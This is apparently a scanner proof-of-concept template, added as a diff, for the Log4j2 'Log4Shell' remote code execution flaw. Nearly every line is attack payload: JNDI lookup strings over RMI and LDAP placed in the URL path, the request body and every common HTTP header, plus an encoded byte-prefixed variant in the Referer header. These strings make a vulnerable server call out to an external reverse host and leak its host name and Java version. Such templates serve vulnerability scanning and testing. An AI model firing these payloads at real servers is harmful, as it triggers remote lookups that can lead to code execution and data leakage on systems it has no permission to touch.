@@ -1,0 +1,85 @@
+name: poc-yaml-log4j2-rce
+title: log4j2 RCE
+set:
+  reverse: newReverse()
+  reverseHost: reverse.url.host
+  payload: b"\xbf\x27\xbf\x22\x25\x62\x66" + bytes("${jndi:rmi://${hostName}.abking.${java:version}.") + bytes(reverseHost) + bytes("/em4fmk}")
+groups:
+  path1:
+    - method: GET
+      path: /
+      follow_redirects: false
+      headers:
+        User-Agent: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36 skyeye-scanner-radical contact: micloud-skyeye@xiaomi.com ${jndi:rmi://${hostName}.abking11.${java:version}.{{reverseHost}}/em4fmk}'
+        Cookie: '${jndi:rmi://${hostName}.abking12.${java:version}.{{reverseHost}}/em4fmk}'
+        Referer: '${jndi:rmi://${hostName}.abking13.${java:version}.{{reverseHost}}/em4fmk}'
+        Content-Type: '${jndi:rmi://${hostName}.abking14.${java:version}.{{reverseHost}}/em4fmk}'
+        Authorization: '${jndi:rmi://${hostName}.abking15.${java:version}.{{reverseHost}}/em4fmk}'
+        Accept: '${jndi:rmi://${hostName}.abking16.${java:version}.{{reverseHost}}/em4fmk}'
+        Accept-Encoding: '${jndi:rmi://${hostName}.abking17.${java:version}.{{reverseHost}}/em4fmk}'
+        Accept-Language: '${jndi:rmi://${hostName}.abking18.${java:version}.{{reverseHost}}/em4fmk}'
+        X-Forwarded-For: '${jndi:rmi://${hostName}.abking19.${java:version}.{{reverseHost}}/em4fmk}'
+      expression: |
+        true && reverse.wait(5)
+  path2:
+    - method: GET
+      path: '/${jndi:ldap://${hostName}.abking21.${java:version}.{{reverseHost}}/em4fmk}'
+      headers:
+        User-Agent: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36 skyeye-scanner-radical contact: micloud-skyeye@xiaomi.com ${jndi:rmi://${hostName}.abking22.${java:version}.{{reverseHost}}/em4fmk}'
+        Cookie: '${jndi:rmi://${hostName}.abking23.${java:version}.{{reverseHost}}/em4fmk}'
+        Referer: '${jndi:rmi://${hostName}.abking24.${java:version}.{{reverseHost}}/em4fmk}'
+        Content-Type: '${jndi:rmi://${hostName}.abking25.${java:version}.{{reverseHost}}/em4fmk}'
+        Authorization: '${jndi:rmi://${hostName}.abking26.${java:version}.{{reverseHost}}/em4fmk}'
+        Accept: '${jndi:rmi://${hostName}.abking27.${java:version}.{{reverseHost}}/em4fmk}'
+        Accept-Encoding: '${jndi:rmi://${hostName}.abking28.${java:version}.{{reverseHost}}/em4fmk}'
+        Accept-Language: '${jndi:rmi://${hostName}.abking29.${java:version}.{{reverseHost}}/em4fmk}'
+        X-Forwarded-For: '${jndi:rmi://${hostName}.abking20.${java:version}.{{reverseHost}}/em4fmk}'
+      follow_redirects: false
+      expression: |
+        true && reverse.wait(5)
+  path3:
+    - method: POST
+      path: /
+      headers:
+        User-Agent: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36 skyeye-scanner-radical contact: micloud-skyeye@xiaomi.com ${jndi:rmi://${hostName}.abking31.${java:version}.{{reverseHost}}/em4fmk}'
+        Cookie: '${jndi:rmi://${hostName}.abking32.${java:version}.{{reverseHost}}/em4fmk}'
+        Referer: '${jndi:rmi://${hostName}.abking33.${java:version}.{{reverseHost}}/em4fmk}'
+        Content-Type: '${jndi:rmi://${hostName}.abking34.${java:version}.{{reverseHost}}/em4fmk}'
+        Authorization: '${jndi:rmi://${hostName}.abking35.${java:version}.{{reverseHost}}/em4fmk}'
+        Accept: '${jndi:rmi://${hostName}.abking36.${java:version}.{{reverseHost}}/em4fmk}'
+        Accept-Encoding: '${jndi:rmi://${hostName}.abking37.${java:version}.{{reverseHost}}/em4fmk}'
+        Accept-Language: '${jndi:rmi://${hostName}.abking38.${java:version}.{{reverseHost}}/em4fmk}'
+        X-Forwarded-For: '${jndi:rmi://${hostName}.abking39.${java:version}.{{reverseHost}}/em4fmk}'
+      follow_redirects: false
+      body: '${jndi:rmi://${hostName}.abking30.${java:version}.{{reverseHost}}/em4fmk}'
+      expression: |
+        true && reverse.wait(5)
+  path4:
+    - method: POST
+      path: '/${jndi:ldap://${hostName}.abking41.${java:version}.{{reverseHost}}/em4fmk}'
+      headers:
+        User-Agent: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36 skyeye-scanner-radical contact: micloud-skyeye@xiaomi.com ${jndi:rmi://${hostName}.abking42.${java:version}.{{reverseHost}}/em4fmk}'
+        Cookie: '${jndi:rmi://${hostName}.abking43.${java:version}.{{reverseHost}}/em4fmk}'
+        Referer: '${jndi:rmi://${hostName}.abking44.${java:version}.{{reverseHost}}/em4fmk}'
+        Content-Type: '${jndi:rmi://${hostName}.abking45.${java:version}.{{reverseHost}}/em4fmk}'
+        Authorization: '${jndi:rmi://${hostName}.abking46.${java:version}.{{reverseHost}}/em4fmk}'
+        Accept: '${jndi:rmi://${hostName}.abking47.${java:version}.{{reverseHost}}/em4fmk}'
+        Accept-Encoding: '${jndi:rmi://${hostName}.abking48.${java:version}.{{reverseHost}}/em4fmk}'
+        Accept-Language: '${jndi:rmi://${hostName}.abking49.${java:version}.{{reverseHost}}/em4fmk}'
+        X-Forwarded-For: '${jndi:rmi://${hostName}.abking50.${java:version}.{{reverseHost}}/em4fmk}'
+      follow_redirects: false
+      body: '${jndi:rmi://${hostName}.abking51.${java:version}.{{reverseHost}}/em4fmk}'
+      expression: |
+        true && reverse.wait(5)
+  path5:
+    - method: GET
+      path: /
+      follow_redirects: false
+      headers:
+        Referer: "{{payload}}"
+      expression: |-
+        true && reverse.wait(5)
+detail:
+  author: BrucessKING
+  links:
+    - ''
